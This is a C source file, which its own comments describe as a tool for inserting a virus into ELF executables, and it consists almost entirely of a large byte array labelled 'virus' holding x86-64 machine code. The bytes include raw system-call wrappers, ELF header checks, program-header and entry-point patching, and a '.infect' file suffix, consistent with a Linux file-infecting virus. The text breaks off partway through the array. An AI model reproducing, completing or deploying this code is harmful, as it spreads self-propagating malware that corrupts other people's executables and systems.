#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <utime.h>
#include <assert.h>
#include "fullnelson.h"

#define APPEND_NUM 448*4096

//This file is intended to insert the inital virus to a ELF file.

//This is the virus
char virus[] = 
{
0x55,0x48,0x89,0xe5,0x48,0x89,0x7d,0xf8,0x48,0x8b,0x45,0xf8,0x48,0x83,0xf8,0x02
,0x7e,0x0f,0x48,0xc7,0xc0,0x03,0x00,0x00,0x00,0x48,0x8b,0x7d,0xf8,0x0f,0x05,0xeb
,0x01,0x90,0x5d,0xc3,0x55,0x48,0x89,0xe5,0x48,0x89,0x7d,0xf8,0x48,0x89,0x75,0xf0
,0x48,0x89,0x55,0xe8,0x48,0x8b,0x7d,0xf8,0x48,0x8b,0x75,0xf0,0x48,0x8b,0x55,0xe8
,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x0f,0x05,0x90,0x5d,0xc3,0x55,0x48,0x89,0xe5
,0x48,0x89,0x7d,0xf8,0x48,0x89,0x75,0xf0,0x48,0x89,0x55,0xe8,0x48,0xc7,0xc0,0x00
,0x00,0x00,0x00,0x48,0x8b,0x7d,0xf8,0x48,0x8b,0x75,0xf0,0x48,0x8b,0x55,0xe8,0x0f
,0x05,0x90,0x5d,0xc3,0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x30,0x48,0x89,0x7d,0xe8
,0x48,0x89,0x75,0xe0,0x48,0x89,0x55,0xd8,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00
,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0x48,0xc7,0xc0,0x02,0x00,0x00,0x00,0x48,0x8b
,0x7d,0xe8,0x48,0x8b,0x75,0xe0,0x48,0x8b,0x55,0xd8,0x0f,0x05,0x48,0x89,0x45,0xf0
,0x48,0x8b,0x45,0xf0,0x48,0x8b,0x4d,0xf8,0x64,0x48,0x33,0x0c,0x25,0x28,0x00,0x00
,0x00,0x74,0x05,0xe8,0x12,0xfe,0xff,0xff,0xc9,0xc3,0x55,0x48,0x89,0xe5,0x48,0x83
,0xec,0x20,0x48,0x89,0x7d,0xe8,0x48,0x89,0x75,0xe0,0x64,0x48,0x8b,0x04,0x25,0x28
,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0x48,0xc7,0xc0,0x05,0x00,0x00,0x00
,0x48,0x8b,0x7d,0xe8,0x48,0x8b,0x75,0xe0,0x0f,0x05,0x48,0x89,0x45,0xf0,0x48,0x8b
,0x45,0xf0,0x48,0x8b,0x55,0xf8,0x64,0x48,0x33,0x14,0x25,0x28,0x00,0x00,0x00,0x74
,0x05,0xe8,0xc4,0xfd,0xff,0xff,0xc9,0xc3,0x55,0x48,0x89,0xe5,0x48,0x89,0x7d,0xf8
,0x48,0x89,0x75,0xf0,0x48,0x89,0x55,0xe8,0x48,0xc7,0xc0,0x08,0x00,0x00,0x00,0x48
,0x8b,0x7d,0xf8,0x48,0x8b,0x75,0xf0,0x48,0x8b,0x55,0xe8,0x0f,0x05,0x90,0x5d,0xc3
,0x55,0x48,0x89,0xe5,0x48,0x81,0xec,0xe0,0x00,0x00,0x00,0x48,0x89,0xbd,0x38,0xff
,0xff,0xff,0x48,0x89,0xb5,0x30,0xff,0xff,0xff,0x48,0x89,0x95,0x28,0xff,0xff,0xff
,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0x48
,0xc7,0x85,0x58,0xff,0xff,0xff,0x01,0x04,0x00,0x00,0x48,0xc7,0xc0,0x02,0x00,0x00
,0x00,0x48,0x8b,0xbd,0x38,0xff,0xff,0xff,0x48,0x8b,0xb5,0x30,0xff,0xff,0xff,0x48
,0x8b,0x95,0x58,0xff,0xff,0xff,0x0f,0x05,0x48,0x89,0x85,0x50,0xff,0xff,0xff,0x48
,0x8b,0x85,0x50,0xff,0xff,0xff,0x48,0x8d,0x95,0x60,0xff,0xff,0xff,0x48,0x89,0xd6
,0x48,0x89,0xc7,0xe8,0x12,0xff,0xff,0xff,0x48,0x8b,0x4d,0x90,0x48,0x8b,0x85,0x50
,0xff,0xff,0xff,0xba,0x00,0x00,0x00,0x00,0x48,0x89,0xce,0x48,0x89,0xc7,0xe8,0x45
,0xff,0xff,0xff,0xc6,0x85,0x4b,0xff,0xff,0xff,0x00,0xc7,0x85,0x4c,0xff,0xff,0xff
,0x00,0x00,0x00,0x00,0xeb,0x25,0x48,0x8b,0x85,0x50,0xff,0xff,0xff,0x48,0x8d,0x8d
,0x4b,0xff,0xff,0xff,0xba,0x01,0x00,0x00,0x00,0x48,0x89,0xce,0x48,0x89,0xc7,0xe8
,0x20,0xfe,0xff,0xff,0x83,0x85,0x4c,0xff,0xff,0xff,0x01,0x81,0xbd,0x4c,0xff,0xff
,0xff,0xff,0xff,0x1b,0x00,0x7e,0xcf,0x48,0x8b,0x85,0x50,0xff,0xff,0xff,0x48,0x89
,0xc7,0xe8,0xda,0xfd,0xff,0xff,0x48,0xc7,0xc0,0x02,0x00,0x00,0x00,0x48,0x8b,0xbd
,0x38,0xff,0xff,0xff,0x48,0x8b,0xb5,0x30,0xff,0xff,0xff,0x48,0x8b,0x95,0x28,0xff
,0xff,0xff,0x0f,0x05,0x48,0x89,0x85,0x50,0xff,0xff,0xff,0x48,0x8b,0x85,0x50,0xff
,0xff,0xff,0x48,0x8b,0x4d,0xf8,0x64,0x48,0x33,0x0c,0x25,0x28,0x00,0x00,0x00,0x74
,0x05,0xe8,0x74,0xfc,0xff,0xff,0xc9,0xc3,0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x40
,0x48,0x89,0x7d,0xe8,0x48,0x89,0x75,0xe0,0x48,0x89,0x55,0xd8,0x48,0x89,0x4d,0xd0
,0x4c,0x89,0x45,0xc8,0x4c,0x89,0x4d,0xc0,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00
,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0x48,0xc7,0xc0,0x09,0x00,0x00,0x00,0x48,0x8b
,0x7d,0xe8,0x48,0x8b,0x75,0xe0,0x48,0x8b,0x55,0xd8,0x4c,0x8b,0x55,0xd0,0x4c,0x8b
,0x45,0xc8,0x4c,0x8b,0x4d,0xc0,0x0f,0x05,0x48,0x89,0x45,0xf0,0x48,0x8b,0x45,0xf0
,0x48,0x8b,0x55,0xf8,0x64,0x48,0x33,0x14,0x25,0x28,0x00,0x00,0x00,0x74,0x05,0xe8
,0x06,0xfc,0xff,0xff,0xc9,0xc3,0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x10,0x48,0x89
,0x7d,0xf8,0x48,0x89,0x75,0xf0,0x48,0x8b,0x55,0xf0,0x48,0x8b,0x45,0xf8,0x48,0x89
,0xc6,0xbf,0x01,0x00,0x00,0x00,0xe8,0x29,0xfd,0xff,0xff,0x90,0xc9,0xc3,0x55,0x48
,0x89,0xe5,0x89,0x7d,0xfc,0x89,0x75,0xf8,0x89,0x55,0xf4,0x89,0x4d,0xf0,0x8b,0x45
,0xfc,0x3b,0x45,0xf4,0x7c,0x0f,0x8b,0x45,0xfc,0x3b,0x45,0xf0,0x7f,0x07,0xb8,0x01
,0x00,0x00,0x00,0xeb,0x4a,0x8b,0x45,0xf8,0x3b,0x45,0xf4,0x7c,0x0f,0x8b,0x45,0xf8
,0x3b,0x45,0xf0,0x7f,0x07,0xb8,0x01,0x00,0x00,0x00,0xeb,0x33,0x8b,0x45,0xf4,0x3b
,0x45,0xfc,0x7c,0x0f,0x8b,0x45,0xf4,0x3b,0x45,0xf8,0x7f,0x07,0xb8,0x01,0x00,0x00
,0x00,0xeb,0x1c,0x8b,0x45,0xf0,0x3b,0x45,0xfc,0x7c,0x0f,0x8b,0x45,0xf0,0x3b,0x45
,0xf8,0x7f,0x07,0xb8,0x01,0x00,0x00,0x00,0xeb,0x05,0xb8,0x00,0x00,0x00,0x00,0x5d
,0xc3,0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x58,0x48,0x89,0x7d,0xc8,0x48,0x89,0x75
,0xc0,0x48,0x89,0x55,0xb8,0x89,0x4d,0xb4,0x4c,0x89,0x45,0xa8,0x48,0x8b,0x45,0xc0
,0x0f,0xb7,0x40,0x38,0x0f,0xb7,0xc0,0x89,0x45,0xe0,0x48,0x8b,0x45,0xc0,0x0f,0xb7
,0x40,0x3c,0x0f,0xb7,0xc0,0x89,0x45,0xe4,0xc7,0x45,0xdc,0xff,0xff,0xff,0xff,0xc7
,0x45,0xd4,0x00,0x00,0x00,0x00,0xe9,0xd2,0x01,0x00,0x00,0x8b,0x45,0xd4,0x48,0x98
,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48
,0x8b,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x40,0x20,0x48,0x85,0xc0,0x0f,0x84,0xa6
,0x01,0x00,0x00,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5
,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b
,0x50,0x20,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x0c,0xc5,0x00
,0x00,0x00,0x00,0x48,0x29,0xc1,0x48,0x8b,0x45,0xb8,0x48,0x01,0xc8,0x48,0x8b,0x40
,0x28,0x48,0x39,0xc2,0x0f,0x85,0x5f,0x01,0x00,0x00,0x8b,0x45,0xd4,0x48,0x98,0x48
,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b
,0x45,0xb8,0x48,0x01,0xd0,0x8b,0x40,0x04,0x83,0xe0,0x01,0x85,0xc0,0x0f,0x84,0x36
,0x01,0x00,0x00,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5
,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b
,0x40,0x10,0x89,0xc1,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14
,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8,0x48,0x01,0xd0,0x48
,0x8b,0x40,0x28,0x01,0xc8,0x89,0x45,0xe8,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0
,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8
,0x48,0x01,0xd0,0x48,0x8b,0x40,0x10,0x89,0xc1,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1
,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45
,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x40,0x28,0x01,0xc8,0x05,0xdb,0x0f,0x00,0x00,0x89
,0x45,0xec,0xc7,0x45,0xd8,0x00,0x00,0x00,0x00,0xeb,0x7f,0x8b,0x45,0xd8,0x48,0x98
,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48
,0x8b,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x40,0x10,0x89,0xc1,0x8b,0x45,0xd8,0x48
,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2
,0x48,0x8b,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x40,0x28,0x01,0xc8,0x83,0xe8,0x01
,0x89,0xc6,0x8b,0x45,0xd8,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00
,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x40
,0x10,0x89,0xc7,0x8b,0x55,0xec,0x8b,0x45,0xe8,0x89,0xd1,0x89,0xc2,0xe8,0x9c,0xfd
,0xff,0xff,0x85,0xc0,0x75,0x12,0x83,0x45,0xd8,0x01,0x8b,0x45,0xd8,0x3b,0x45,0xe0
,0x0f,0x8c,0x75,0xff,0xff,0xff,0xeb,0x01,0x90,0x8b,0x45,0xd8,0x3b,0x45,0xe0,0x75
,0x08,0x8b,0x45,0xd4,0x89,0x45,0xdc,0xeb,0x10,0x83,0x45,0xd4,0x01,0x8b,0x45,0xd4
,0x3b,0x45,0xe0,0x0f,0x8c,0x22,0xfe,0xff,0xff,0x83,0x7d,0xdc,0xff,0x75,0x0a,0xb8
,0xff,0xff,0xff,0xff,0xe9,0x46,0x02,0x00,0x00,0x8b,0x45,0xdc,0x48,0x98,0x48,0xc1
,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45
,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x40,0x20,0x89,0xc1,0x8b,0x45,0xdc,0x48,0x98,0x48
,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b
,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x40,0x08,0x01,0xc8,0x89,0x45,0xf0,0x8b,0x45
,0xf0,0x05,0xdb,0x0f,0x00,0x00,0x89,0x45,0xf4,0xc7,0x45,0xf8,0xdc,0x0f,0x00,0x00
,0x8b,0x45,0xb4,0x89,0x45,0xfc,0x8b,0x45,0xfc,0x2d,0x01,0x00,0x1c,0x00,0x89,0x45
,0xd4,0xeb,0x29,0x8b,0x45,0xd4,0x48,0x98,0x48,0x8d,0x90,0x00,0x00,0x1c,0x00,0x48
,0x8b,0x45,0xa8,0x48,0x01,0xc2,0x8b,0x45,0xd4,0x48,0x63,0xc8,0x48,0x8b,0x45,0xa8
,0x48,0x01,0xc8,0x0f,0xb6,0x00,0x88,0x02,0x83,0x6d,0xd4,0x01,0x8b,0x45,0xd4,0x3b
,0x45,0xf0,0x7d,0xcf,0x48,0x81,0x45,0xc8,0x00,0x00,0x1c,0x00,0xc7,0x45,0xd4,0x00
,0x00,0x00,0x00,0xe9,0x05,0x01,0x00,0x00,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0
,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8
,0x48,0x01,0xd0,0x48,0x8b,0x50,0x08,0x8b,0x45,0xf0,0x48,0x98,0x48,0x39,0xc2,0x72
,0x49,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00
,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8,0x48,0x01,0xc2,0x8b,0x45,0xd4,0x48
,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x0c,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc1
,0x48,0x8b,0x45,0xb8,0x48,0x01,0xc8,0x48,0x8b,0x40,0x08,0x48,0x05,0x00,0x00,0x1c
,0x00,0x48,0x89,0x42,0x08,0xe9,0x8f,0x00,0x00,0x00,0x8b,0x45,0xd4,0x48,0x98,0x48
,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b
,0x45,0xb8,0x48,0x01,0xd0,0x48,0x8b,0x50,0x08,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1
,0xe0,0x03,0x48,0x8d,0x0c,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc1,0x48,0x8b,0x45
,0xb8,0x48,0x01,0xc8,0x48,0x8b,0x40,0x20,0x48,0x01,0xc2,0x8b,0x45,0xf0,0x48,0x98
,0x48,0x39,0xc2,0x76,0x44,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d
,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x45,0xb8,0x48,0x01,0xc2
,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x0c,0xc5,0x00,0x00,0x00
,0x00,0x48,0x29,0xc1,0x48,0x8b,0x45,0xb8,0x48,0x01,0xc8,0x48,0x8b,0x40,0x20,0x48
,0x05,0x00,0x00,0x1c,0x00,0x48,0x89,0x42,0x20,0x83,0x45,0xd4,0x01,0x8b,0x45,0xd4
,0x3b,0x45,0xe0,0x0f,0x8c,0xef,0xfe,0xff,0xff,0xc7,0x45,0xd4,0x00,0x00,0x00,0x00
,0xeb,0x5b,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x06,0x48,0x89,0xc2,0x48,0x8b
,0x45,0xc8,0x48,0x01,0xd0,0x48,0x8b,0x50,0x18,0x8b,0x45,0xf0,0x48,0x98,0x48,0x39
,0xc2,0x72,0x36,0x8b,0x45,0xd4,0x48,0x98,0x48,0xc1,0xe0,0x06,0x48,0x89,0xc2,0x48
,0x8b,0x45,0xc8,0x48,0x01,0xd0,0x8b,0x55,0xd4,0x48,0x63,0xd2,0x48,0x89,0xd1,0x48
,0xc1,0xe1,0x06,0x48,0x8b,0x55,0xc8,0x48,0x01,0xca,0x48,0x8b,0x52,0x18,0x48,0x81
,0xc2,0x00,0x00,0x1c,0x00,0x48,0x89,0x50,0x18,0x83,0x45,0xd4,0x01,0x8b,0x45,0xd4
,0x3b,0x45,0xe4,0x7c,0x9d,0x48,0x8b,0x45,0xc0,0x48,0x8b,0x40,0x28,0x48,0x8d,0x90
,0x00,0x00,0x1c,0x00,0x48,0x8b,0x45,0xc0,0x48,0x89,0x50,0x28,0x8b,0x45,0xdc,0xc9
,0xc3,0x55,0x48,0x89,0xe5,0x48,0x81,0xec,0x10,0x02,0x00,0x00,0x48,0x89,0xbd,0xf8
,0xfd,0xff,0xff,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00,0x00,0x48,0x89,0x45,0xf8
,0x31,0xc0,0xc7,0x85,0x04,0xfe,0xff,0xff,0x00,0x00,0x00,0x00,0xeb,0x2c,0x8b,0x85
,0x04,0xfe,0xff,0xff,0x48,0x63,0xd0,0x48,0x8b,0x85,0xf8,0xfd,0xff,0xff,0x48,0x01
,0xd0,0x0f,0xb6,0x10,0x8b,0x85,0x04,0xfe,0xff,0xff,0x48,0x98,0x88,0x94,0x05,0xf0
,0xfe,0xff,0xff,0x83,0x85,0x04,0xfe,0xff,0xff,0x01,0x8b,0x85,0x04,0xfe,0xff,0xff
,0x48,0x63,0xd0,0x48,0x8b,0x85,0xf8,0xfd,0xff,0xff,0x48,0x01,0xd0,0x0f,0xb6,0x00
,0x84,0xc0,0x75,0xba,0x48,0x8d,0x95,0xf0,0xfe,0xff,0xff,0x8b,0x85,0x04,0xfe,0xff
,0xff,0x48,0x98,0x48,0x01,0xd0,0x48,0xbe,0x2e,0x69,0x6e,0x66,0x65,0x63,0x74,0x00
,0x48,0x89,0x30,0x48,0x8b,0x85,0xf8,0xfd,0xff,0xff,0xba,0x00,0x00,0x00,0x00,0xbe
,0x02,0x00,0x00,0x00,0x48,0x89,0xc7,0xe8,0xd8,0xf7,0xff,0xff,0x48,0x89,0x85,0x08
,0xfe,0xff,0xff,0x48,0x8d,0x95,0x60,0xfe,0xff,0xff,0x48,0x8b,0x85,0x08,0xfe,0xff
,0xff,0x48,0x89,0xd6,0x48,0x89,0xc7,0xe8,0x0e,0xf8,0xff,0xff,0x48,0x8b,0x85,0x08
,0xfe,0xff,0xff,0x48,0x8b,0x95,0x90,0xfe,0xff,0xff,0x48,0x89,0xd6,0x41,0xb9,0x00
,0x00,0x00,0x00,0x49,0x89,0xc0,0xb9,0x01,0x00,0x00,0x00,0xba,0x03,0x00,0x00,0x00
,0xbf,0x00,0x00,0x00,0x00,0xe8,0x7e,0xf9,0xff,0xff,0x48,0x89,0x85,0x28,0xfe,0xff
,0xff,0x48,0xb8,0x03,0x11,0x96,0x19,0x03,0x11,0x96,0x19,0x48,0x89,0x85,0x18,0xfe
,0xff,0xff,0x48,0x8b,0x85,0x28,0xfe,0xff,0xff,0x48,0x85,0xc0,0x0f,0x8e,0x51,0x03
,0x00,0x00,0x48,0x8b,0x85,0x28,0xfe,0xff,0xff,0x8b,0x00,0x3d,0x7f,0x45,0x4c,0x46
,0x0f,0x85,0x3d,0x03,0x00,0x00,0x48,0x8d,0x85,0xf0,0xfe,0xff,0xff,0xba,0x09,0x03
,0x00,0x00,0xbe,0x42,0x00,0x00,0x00,0x48,0x89,0xc7,0xe8,0x35,0xf7,0xff,0xff,0x48
,0x89,0x85,0x20,0xfe,0xff,0xff,0x48,0x83,0xbd,0x20,0xfe,0xff,0xff,0x00,0x0f,0x8e
,0x0f,0x03,0x00,0x00,0x48,0x8b,0x85,0x08,0xfe,0xff,0xff,0x48,0x89,0xc7,0xe8,0x9d
,0xf6,0xff,0xff,0x48,0x8b,0x85,0xf8,0xfd,0xff,0xff,0xba,0x00,0x00,0x00,0x00,0xbe
,0x02,0x00,0x00,0x00,0x48,0x89,0xc7,0xe8,0xc4,0xf7,0xff,0xff,0x48,0x89,0x85,0x08
,0xfe,0xff,0xff,0x48,0x8d,0x95,0x60,0xfe,0xff,0xff,0x48,0x8b,0x85,0x08,0xfe,0xff
,0xff,0x48,0x89,0xd6,0x48,0x89,0xc7,0xe8,0x2e,0xf7,0xff,0xff,0x48,0x8b,0x85,0x08
,0xfe,0xff,0xff,0x48,0x8b,0x95,0x90,0xfe,0xff,0xff,0x48,0x89,0xd6,0x41,0xb9,0x00
,0x00,0x00,0x00,0x49,0x89,0xc0,0xb9,0x01,0x00,0x00,0x00,0xba,0x03,0x00,0x00,0x00
,0xbf,0x00,0x00,0x00,0x00,0xe8,0x9e,0xf8,0xff,0xff,0x48,0x89,0x85,0x28,0xfe,0xff
,0xff,0x48,0x8b,0x85,0x28,0xfe,0xff,0xff,0x48,0x89,0x85,0x30,0xfe,0xff,0xff,0x48
,0x8b,0x85,0x30,0xfe,0xff,0xff,0x48,0x8b,0x50,0x20,0x48,0x8b,0x85,0x28,0xfe,0xff
,0xff,0x48,0x01,0xd0,0x48,0x89,0x85,0x38,0xfe,0xff,0xff,0x48,0x8b,0x85,0x30,0xfe
,0xff,0xff,0x48,0x8b,0x50,0x28,0x48,0x8b,0x85,0x28,0xfe,0xff,0xff,0x48,0x01,0xd0
,0x48,0x89,0x85,0x40,0xfe,0xff,0xff,0x48,0x8b,0x85,0x90,0xfe,0xff,0xff,0x89,0xc7
,0x48,0x8b,0x8d,0x28,0xfe,0xff,0xff,0x48,0x8b,0x95,0x38,0xfe,0xff,0xff,0x48,0x8b
,0xb5,0x30,0xfe,0xff,0xff,0x48,0x8b,0x85,0x40,0xfe,0xff,0xff,0x49,0x89,0xc8,0x89
,0xf9,0x48,0x89,0xc7,0xe8,0x28,0xf9,0xff,0xff,0x48,0x98,0x48,0x89,0x85,0x48,0xfe
,0xff,0xff,0x48,0x83,0xbd,0x48,0xfe,0xff,0xff,0xff,0x0f,0x84,0x03,0x02,0x00,0x00
,0x48,0x8b,0x85,0x48,0xfe,0xff,0xff,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00
,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b,0x85,0x38,0xfe,0xff,0xff,0x48,0x01,0xd0
,0x48,0x8b,0x50,0x08,0x48,0x8b,0x85,0x48,0xfe,0xff,0xff,0x48,0xc1,0xe0,0x03,0x48
,0x8d,0x0c,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc1,0x48,0x8b,0x85,0x38,0xfe,0xff
,0xff,0x48,0x01,0xc8,0x48,0x8b,0x40,0x20,0x48,0x01,0xd0,0x48,0x89,0x85,0x50,0xfe
,0xff,0xff,0x48,0x8b,0x95,0x50,0xfe,0xff,0xff,0x48,0x8b,0x85,0x28,0xfe,0xff,0xff
,0x48,0x01,0xd0,0x48,0x89,0x85,0x10,0xfe,0xff,0xff,0xc7,0x85,0x00,0xfe,0xff,0xff
,0x00,0x00,0x00,0x00,0xeb,0x2a,0x48,0x8b,0x85,0x18,0xfe,0xff,0xff,0x0f,0xb6,0x10
,0x48,0x8b,0x85,0x10,0xfe,0xff,0xff,0x88,0x10,0x83,0x85,0x00,0xfe,0xff,0xff,0x01
,0x48,0x83,0x85,0x18,0xfe,0xff,0xff,0x01,0x48,0x83,0x85,0x10,0xfe,0xff,0xff,0x01
,0x81,0xbd,0x00,0xfe,0xff,0xff,0xdb,0x0f,0x00,0x00,0x7e,0xca,0x48,0x8b,0x85,0x48
,0xfe,0xff,0xff,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48
,0x29,0xc2,0x48,0x8b,0x85,0x38,0xfe,0xff,0xff,0x48,0x01,0xc2,0x48,0x8b,0x85,0x48
,0xfe,0xff,0xff,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x0c,0xc5,0x00,0x00,0x00,0x00,0x48
,0x29,0xc1,0x48,0x8b,0x85,0x38,0xfe,0xff,0xff,0x48,0x01,0xc8,0x48,0x8b,0x40,0x20
,0x48,0x05,0xdc,0x0f,0x00,0x00,0x48,0x89,0x42,0x20,0x48,0x8b,0x85,0x48,0xfe,0xff
,0xff,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2
,0x48,0x8b,0x85,0x38,0xfe,0xff,0xff,0x48,0x01,0xc2,0x48,0x8b,0x85,0x48,0xfe,0xff
,0xff,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x0c,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc1
,0x48,0x8b,0x85,0x38,0xfe,0xff,0xff,0x48,0x01,0xc8,0x48,0x8b,0x40,0x28,0x48,0x05
,0xdc,0x0f,0x00,0x00,0x48,0x89,0x42,0x28,0x48,0x8b,0x85,0x48,0xfe,0xff,0xff,0x48
,0xc1,0xe0,0x03,0x48,0x8d,0x14,0xc5,0x00,0x00,0x00,0x00,0x48,0x29,0xc2,0x48,0x8b
,0x85,0x38,0xfe,0xff,0xff,0x48,0x01,0xd0,0x48,0x8b,0x50,0x10,0x48,0x8b,0x85,0x48
,0xfe,0xff,0xff,0x48,0xc1,0xe0,0x03,0x48,0x8d,0x0c,0xc5,0x00,0x00,0x00,0x00,0x48
,0x29,0xc1,0x48,0x8b,0x85,0x38,0xfe,0xff,0xff,0x48,0x01,0xc8,0x48,0x8b,0x40,0x20
,0x48,0x01,0xd0,0x48,0x89,0x85,0x58,0xfe,0xff,0xff,0x48,0x8b,0x85,0x10,0xfe,0xff
,0xff,0x48,0x8d,0x50,0xfc,0x48,0x8b,0x85,0x30,0xfe,0xff,0xff,0x48,0x8b,0x40,0x18
,0x89,0xc1,0x48,0x8b,0x85,0x58,0xfe,0xff,0xff,0x29,0xc1,0x89,0xc8,0x89,0x02,0x48
,0x8b,0x85,0x50,0xfe,0xff,0xff,0x48,0x8d,0x90,0xf3,0x08,0x00,0x00,0x48,0x8b,0x85
,0x28,0xfe,0xff,0xff,0x48,0x01,0xd0,0x48,0x8b,0x95,0x58,0xfe,0xff,0xff,0x48,0x81
,0xea,0xdc,0x0f,0x00,0x00,0x48,0x89,0x10,0x48,0x8b,0x85,0x58,0xfe,0xff,0xff,0x48
,0x2d,0xbc,0x02,0x00,0x00,0x48,0x89,0xc2,0x48,0x8b,0x85,0x30,0xfe,0xff,0xff,0x48
,0x89,0x50,0x18,0x48,0x8b,0x85,0x20,0xfe,0xff,0xff,0x48,0x89,0xc7,0xe8,0x8e,0xf3
,0xff,0xff,0x48,0x8b,0x85,0x08,0xfe,0xff,0xff,0x48,0x89,0xc7,0xe8,0x7f,0xf3,0xff
,0xff,0x90,0x48,0x8b,0x45,0xf8,0x64,0x48,0x33,0x04,0x25,0x28,0x00,0x00,0x00,0x74
,0x05,0xe8,0x44,0xf2,0xff,0xff,0xc9,0xc3,0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x10
,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0xb8
,0x02,0x00,0x00,0x00,0xcd,0x80,0x89,0x45,0xf4,0x8b,0x45,0xf4,0x48,0x8b,0x55,0xf8
,0x64,0x48,0x33,0x14,0x25,0x28,0x00,0x00,0x00,0x74,0x05,0xe8,0x0a,0xf2,0xff,0xff
,0xc9,0xc3,0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x20,0x48,0x89,0x7d,0xe8,0x48,0x89
,0x75,0xe0,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31
,0xc0,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x48,0x8b,0x7d,0xe8,0x48,0x8b,0x75,0xe0
,0x0f,0x05,0x48,0x89,0x45,0xf4,0x8b,0x45,0xf4,0x48,0x8b,0x55,0xf8,0x64,0x48,0x33
,0x14,0x25,0x28,0x00,0x00,0x00,0x74,0x05,0xe8,0xbd,0xf1,0xff,0xff,0xc9,0xc3,0x55
